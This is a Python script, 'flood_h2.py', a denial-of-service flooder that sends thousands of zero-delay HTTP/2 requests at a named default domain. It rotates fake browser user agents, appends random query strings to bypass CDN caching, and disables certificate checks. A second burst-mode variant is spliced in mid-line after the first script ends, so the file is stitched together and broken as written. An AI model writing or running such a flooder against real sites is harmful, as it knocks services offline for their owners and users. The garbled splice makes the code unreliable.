#!/usr/bin/env python3
"""
flood_h2.py - HTTP/2 multiplexed, zero-delay, cache-bypass flooder
Suitable for CDN/edge-hosted targets (Vercel, Netlify, Cloudflare Pages...)

Why HTTP/2: hundreds of concurrent requests ride as *streams* over just a
handful of TLS connections. No per-request handshake => the "SSL connection
is closed" churn disappears and sustained req/s goes way up.

Usage:
  python3 flood_h2.py https://zarir.org -c 2000
  python3 flood_h2.py https://zarir.org -c 3000 -d 120 -r
  python3 flood_h2.py "https://zarir.org,https://zarir.org/about" -c 2000 -r

Deps: pip install "httpx[http2]"
"""

import asyncio
import random
import sys
import time
import warnings
from collections import Counter

import httpx

warnings.filterwarnings("ignore")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
]


def parse_args(argv):
    url = "https://zarir.org"
    concurrency = 2000
    duration = 0
    cache_bust = False
    paths = None
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("-c", "--concurrency") and i + 1 < len(argv):
            concurrency = int(argv[i + 1]); i += 2
        elif a in ("-d", "--duration") and i + 1 < len(argv):
            duration = int(argv[i + 1]); i += 2
        elif a == "-r":
            cache_bust = True; i += 1
        elif a in ("-p", "--paths") and i + 1 < len(argv):
            paths = [p.strip() for p in argv[i + 1].split(",") if p.strip()]; i += 2
        elif a in ("-h", "--help"):
            print(__doc__); sys.exit(0)
        else:
            url = a; i += 1
    return url, concurrency, duration, cache_bust, paths


async def hammer(client, urls, paths, cache_bust, stats):
    """Zero-delay loop: one request finishes -> next starts immediately."""
    while True:
        base = random.choice(urls)
        url = base
        if paths:
            sep = "&" if "?" in base else "?"
            url = f"{base}{sep}{random.choice(paths).lstrip('?')}"
        if cache_bust:
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}_={random.randint(0, 2**31)}"   # defeat edge cache
        t0 = time.monotonic()
        try:
            r = await client.get(
                url,
                headers={
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "Pragma": "no-cache",
                },
            )
            stats["sent"] += 1
            stats["codes"][r.status_code] = stats["codes"].get(r.status_code, 0) + 1
            stats["lat"] += (time.monotonic() - t0) * 1000.0
        except (httpx.HTTPError, OSError):
            stats["errors"] += 1
        # no sleep here -> zero latency between requests


async def reporter(stats, start):
    last, last_sent, peak = time.monotonic(), 0, 0.0
    while True:
        await asyncio.sleep(1)
        now = time.monotonic()
        rate = (stats["sent"] - last_sent) / (now - last)
        peak = max(peak, rate)
        last, last_sent = now, stats["sent"]
        avg = stats["lat"] / stats["sent"] if stats["sent"] else 0.0
        top = " ".join(f"{k}:{v}" for k, v in Counter(stats["codes"]).most_common(4)) or "-"
        print(f"[{time.strftime('%H:%M:%S')}] {rate:7.0f} req/s | total={stats['sent']:9d} "
              f"| err={stats['errors']:5d} | avg={avg:6.1f}ms | {top}", flush=True)
        if stats["sent"] % 10000 == 0 and stats["sent"] > 0:
            print(f"   peak so far: {peak:.0f} req/s", flush=True)


async def main():
    url, concurrency, duration, cache_bust, paths = parse_args(sys.argv[1:])
    urls = [u.strip() for u in url.split(",") if u.strip()]
    print(f"[*] Target       : {urls}")
    print(f"[*] Concurrency  : {concurrency} in-flight (HTTP/2 multiplexed)")
    print(f"[*] Cache-bust   : {'ON (random query per request)' if cache_bust else 'OFF'}")
    print(f"[*] Duration     : {'unlimited (Ctrl+C)' if duration <= 0 else str(duration) + 's'}")
    print(f"[*] Protocol     : HTTP/2, zero delay\n")

    # Few long-lived HTTP/2 connections; all concurrency rides as streams.
    limits = httpx.Limits(max_connections=16, max_keepalive_connections=16)
    stats = {"sent": 0, "errors": 0, "codes": {}, "lat": 0.0}
    start = time.monotonic()

    async with httpx.AsyncClient(
        http2=True,
        verify=False,
        follow_redirects=True,
        limits=limits,
        timeout=httpx.Timeout(5.0, connect=5.0),
    ) as client:
        rep = asyncio.create_task(reporter(stats, start))
        tasks = [asyncio.create_task(hammer(client, urls, paths, cache_bust, stats))
                 for _ in range(concurrency)]
        try:
            if duration > 0:
                await asyncio.sleep(duration)
            else:
                while True:
                    await asyncio.sleep(3600)
        except KeyboardInterrupt:
            pass
        finally:
            for t in tasks:
                t.cancel()
            rep.cancel()
            await asyncio.sleep(0.2)

    elapsed = time.monotonic() - start
    print("\n============== FINAL REPORT ==============")
    print(f"Total requests : {stats['sent']}")
    print(f"Avg rate       : {stats['sent']/elapsed:.0f} req/s")
    print(f"Errors         : {stats['errors']}")
    if stats["sent"]:
        print(f"Avg latency    : {stats['lat']/stats['sent']:.1f} ms")
    print(f"Status codes   : {dict(Counter(stats['codes']))}")
    print("==========================================")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass    while i < len(argv):
        a = argv[i]
        if a in ("-c", "--concurrency") and i + 1 < len(argv):
            concurrency = int(argv[i + 1]); i += 2
        elif a in ("-b", "--burst") and i + 1 < len(argv):
            burst = int(argv[i + 1]); i += 2
        elif a in ("-d", "--duration") and i + 1 < len(argv):
            duration = int(argv[i + 1]); i += 2
        elif a == "-r":
            cache_bust = True; i += 1
        elif a in ("-h", "--help"):
            print(__doc__); sys.exit(0)
        else:
            url = a; i += 1
    return url, concurrency, burst, duration, cache_bust


async def one(client, urls, cache_bust, stats):
    base = random.choice(urls)
    url = base
    if cache_bust:
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}_={random.randint(0, 2**31)}"
    t0 = time.monotonic()
    try:
        r = await client.get(url, headers={
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Cache-Control": "no-cache, no-store",
            "Pragma": "no-cache",
        })
        stats["sent"] += 1
        stats["codes"][r.status_code] = stats["codes"].get(r.status_code, 0) + 1
        stats["lat"] += (time.monotonic() - t0) * 1000.0
    except (httpx.HTTPError, OSError):
        stats["errors"] += 1


async def hammer(client, urls, cache_bust, burst, stats):
    """Burst loop: fire N requests concurrently, repeat instantly. No sleep."""
    while True:
        if burst > 1:
            await asyncio.gather(*(one(client, urls, cache_bust, stats) for _ in range(burst)))
        else:
            await one(client, urls, cache_bust, stats)


async def reporter(stats):
    last, last_sent, peak = time.monotonic(), 0, 0.0
    while True:
        await asyncio.sleep(1)
        now = time.monotonic()
        rate = (stats["sent"] - last_sent) / (now - last)
        peak = max(peak, rate)
        last, last_sent = now, stats["sent"]
        avg = stats["lat"] / stats["sent"] if stats["sent"] else 0.0
        top = " ".join(f"{k}:{v}" for k, v in Counter(stats["codes"]).most_common(4)) or "-"
        print(f"[{time.strftime('%H:%M:%S')}] {rate:8.0f} req/s | total={stats['sent']:10d} "
              f"| err={stats['errors']:5d} | avg={avg:7.1f}ms | {top}", flush=True)
        if peak > 0 and stats["sent"] % 50000 < 1000:
            print(f"   peak: {peak:.0f} req/s", flush=True)


async def main():
    url, concurrency, burst, duration, cache_bust = parse_args(sys.argv[1:])
    urls = [u.strip() for u in url.split(",") if u.strip()]
    in_flight = concurrency * burst
    print(f"[*] Target       : {urls}")
    print(f"[*] Concurrency  : {concurrency} tasks x burst {burst} = {in_flight} in-flight")
    print(f"[*] Cache-bust   : ON")
    print(f"[*] Duration     : {'unlimited (Ctrl+C)' if duration <= 0 else str(duration) + 's'}")
    print(f"[*] Protocol     : HTTP/2 | Zero delay\n")

    limits = httpx.Limits(max_connections=16, max_keepalive_connections=16)
    stats = {"sent": 0, "errors": 0, "codes": {}, "lat": 0.0}
    start = time.monotonic()

    async with httpx.AsyncClient(
        http2=True, verify=False, follow_redirects=True,
        limits=limits, timeout=httpx.Timeout(10.0),
    ) as client:
        rep = asyncio.create_task(reporter(stats))
        tasks = [asyncio.create_task(hammer(client, urls, cache_bust, burst, stats))
                 for _ in range(concurrency)]
        try:
            if duration > 0:
                await asyncio.sleep(duration)
            else:
                while True:
                    await asyncio.sleep(3600)
        except KeyboardInterrupt:
            pass
        finally:
            for t in tasks:
                t.cancel()
            rep.cancel()
            await asyncio.sleep(0.2)

    elapsed = time.monotonic() - start
    print("\n============== FINAL REPORT ==============")
    print(f"Total requests : {stats['sent']}")
    print(f"Avg rate       : {stats['sent']/elapsed:.0f} req/s")
    print(f"Errors         : {stats['errors']}")
    if stats["sent"]:
        print(f"Avg latency    : {stats['lat']/stats['sent']:.1f} ms")
    print(f"Status codes   : {dict(Counter(stats['codes']))}")
    print("==========================================")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
